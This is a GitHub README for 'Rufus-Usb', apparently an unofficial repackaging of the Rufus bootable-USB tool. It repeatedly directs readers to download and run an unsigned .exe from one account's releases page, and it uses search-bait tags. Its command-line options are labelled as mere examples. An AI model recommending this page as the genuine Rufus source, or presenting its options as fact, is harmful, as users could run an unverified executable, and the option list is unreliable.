https://github.com/AwaisAhmed0037/Rufus-Usb/releases

[![Download Release](https://img.shields.io/badge/Download-Releases-blue?logo=github)](https://github.com/AwaisAhmed0037/Rufus-Usb/releases)

# Rufus-Usb — Create Bootable USB Drives Fast, Free (2025) 🚀

![Rufus USB banner](https://upload.wikimedia.org/wikipedia/commons/7/70/USB_flash_drive_icon.svg)

Rufus-Usb is a compact utility for creating bootable USB drives from ISO images. It supports BIOS and UEFI modes, multiple partition schemes, and a wide set of options for flashing installers, rescue tools, and live systems. This repo packages releases you can download and run on Windows.

Badges
- ![Topics](https://img.shields.io/badge/topics-create--bootable--usb%20%7C%20rufus-blue)
- ![Build](https://img.shields.io/badge/version-2025.0.0-green)
- ![License](https://img.shields.io/badge/license-MIT-lightgrey)

Table of contents
- About
- Key features
- Supported media and formats
- Screenshots
- Quick start
- Download and run
- Command line usage
- Common workflows
- Advanced options
- Troubleshooting
- Release notes
- Contributing
- License
- Credits and links

About
Rufus-Usb writes ISO images to USB drives and prepares those drives to boot on modern and legacy hardware. It focuses on reliability, wide device support, and small footprint. Use it to flash OS installers, recovery tools, diagnostics, and portable live systems.

Key features
- Create bootable USB drives from ISO (Windows, Linux, other OS).
- Support for UEFI, UEFI-CSM, and legacy BIOS boot modes.
- Choice of partition scheme: MBR or GPT.
- Format options: FAT32, NTFS, exFAT, and raw write modes.
- Secure Boot support on compatible images.
- Option to add persistence for compatible live Linux images.
- Low-level image write for raw dd-style ISO writing.
- Simple GUI and full command-line support.
- Portable executable; no installer required.

Supported media and formats
- USB flash drives (FAT32/NTFS/exFAT)
- USB hard drives
- SD cards and microSD (via adapter)
- ISO images (.iso)
- IMG files and raw disk images
- Compressed images (where supported by the image handler)

Screenshots
![Main UI](https://raw.githubusercontent.com/AwaisAhmed0037/Rufus-Usb/main/assets/screenshot-main.png)
![Options panel](https://raw.githubusercontent.com/AwaisAhmed0037/Rufus-Usb/main/assets/screenshot-options.png)

Quick start
1. Plug a USB drive into your PC.
2. Open Rufus-Usb.
3. Select the target device.
4. Choose the ISO image.
5. Set partition scheme and file system.
6. Click Start.

Download and run
This repository hosts release builds you can download. Download the binary from the Releases page and run it on Windows.

- Go to the Releases page and download the file for your platform:
  https://github.com/AwaisAhmed0037/Rufus-Usb/releases
- Choose the .exe file for Windows (for example, Rufus-Usb-2025.0.0.exe).
- Double-click the downloaded file to run the tool.
- Follow the UI to write your ISO to the USB device.

If the link above does not work, check the Releases section in this repository for the latest builds and assets:
https://github.com/AwaisAhmed0037/Rufus-Usb/releases

Command line usage
Rufus-Usb supports a set of command-line options for scripted workflows and automation. All options below are examples. Use rufus-usb.exe --help to list current options in your build.

Basic example
rufus-usb.exe --device \\.\PhysicalDrive1 --iso C:\images\ubuntu.iso --format NTFS --scheme GPT --force

Options (common)
- --device <path> : target device path (\\.\PhysicalDriveN on Windows)
- --iso <file> : path to ISO or IMG file
- --format <FAT32|NTFS|exFAT|RAW> : file system for the target
- --scheme <MBR|GPT> : partition scheme
- --label <name> : volume label
- --force : skip prompts and write without confirmation
- --verify : verify written media after flashing
- --persistent <size> : enable persistence for compatible live Linux images (size in MB)
- --log <file> : write a detailed log to file

Common workflows

Create a Windows installer on USB (UEFI+GPT)
- Select GPT partition scheme.
- Format as NTFS if the installer contains files >4GB.
- Enable UEFI boot in target machine firmware.

Create a Linux live USB (FAT32 + persistence)
- Choose FAT32 when ISO supports EFI files.
- Add persistence if you want to save changes.
- Use the ISOHybrid or dd mode for non-standard images.

Write a raw image
- Use RAW mode for exact byte-for-byte writes.
- Choose device path carefully. RAW will overwrite the entire drive.

Advanced options
- Bad block check: run a surface read to detect failing sectors.
- Custom bootloader: replace or install a bootloader in the target partition.
- File copy post-process: execute a script to copy extra files to the USB after flashing.
- Logging: enable full logging to debug write failures or verify steps.

Safety and device handling
- Rufus-Usb will overwrite the selected device. Confirm the target device before writing.
- Back up important data before formatting.
- Use force only in automated tasks where you already validated the device path.

Troubleshooting
- ISO not detected: make sure the ISO is not corrupted. Verify checksum.
- Device not listed: try another USB port. Use a direct port, not a hub.
- Write fails mid-process: check disk health and try a different USB drive.
- Boot fails on target machine: confirm firmware settings (UEFI vs BIOS) and secure boot.

Logs and diagnostics
- Use the --log option to capture a full run log.
- Logs include device details, partition layout, and any error codes.
- Share logs when filing issues on the repo.

Release notes
Visit the Releases page to download current builds and see change logs:
https://github.com/AwaisAhmed0037/Rufus-Usb/releases

Each release includes:
- Executable binaries for Windows builds.
- SHA256 checksum files to verify integrity.
- Release notes with bug fixes and new features.

Contributing
- Fork the repo and create a branch for your feature or fix.
- Open a pull request with a clear description and test steps.
- Include unit tests for core code paths where possible.
- Follow the coding style and keep changes focused.

Issue reporting
- Create an issue with a clear title.
- Include environment details: OS version, device model, and Rufus-Usb build.
- Attach logs and screenshots if possible.
- Provide steps to reproduce.

Packaging and builds
- Windows builds use a minimal toolchain to keep the binary small.
- Releases contain portable executables, not installers.
- Build scripts are in the build/ directory of the repo.

Examples and scripts
- scripts/flash-windows.ps1 — A sample PowerShell script to flash Windows installer.
- scripts/flash-linux.sh — Bash script showing dd-style raw writes for Linux.
- examples/persistence.cfg — Sample persistence setup for live Linux images.

FAQ
Q: Can I use Rufus-Usb on non-Windows systems?
A: The packaged builds target Windows. You can run Windows builds under wine with limited support. Native support for other platforms depends on community ports.

Q: Does Rufus-Usb modify the device firmware?
A: No. Rufus-Usb writes data to the device storage only.

Q: How do I ensure a USB installer boots on modern hardware?
A: Use GPT + FAT32 for pure UEFI setups if the installer fits within FAT32 limits. Use NTFS when files exceed FAT32 limits but confirm UEFI supports NTFS on the target device or use a small FAT32 EFI partition.

License
This repository uses the MIT license. See LICENSE.md for the full text.

Credits and links
- Tool name: Rufus-Usb (this repo)
- Main developer: AwaisAhmed0037 and contributors
- Official releases and downloads:
  https://github.com/AwaisAhmed0037/Rufus-Usb/releases
- Useful references:
  - Rufus official site and docs (for original Rufus behavior)
  - ISOHybrid documentation for hybrid ISO handling
  - UEFI specification for boot mode details

Tags
create-bootable-usb, create-bootable-usb-drives, flash-drives, rufus, rufus-2024, rufus-2025, rufus-download, rufus-free, rufus-full, rufus-usb

Roadmap
- Add signed builds for release validation.
- Add a native Linux GUI port.
- Improve persistence handling for multiple distributions.
- Add a verification mode that compares SHA256 of copied files.

Contact
Open an issue on the repo for feature requests, bug reports, or general questions.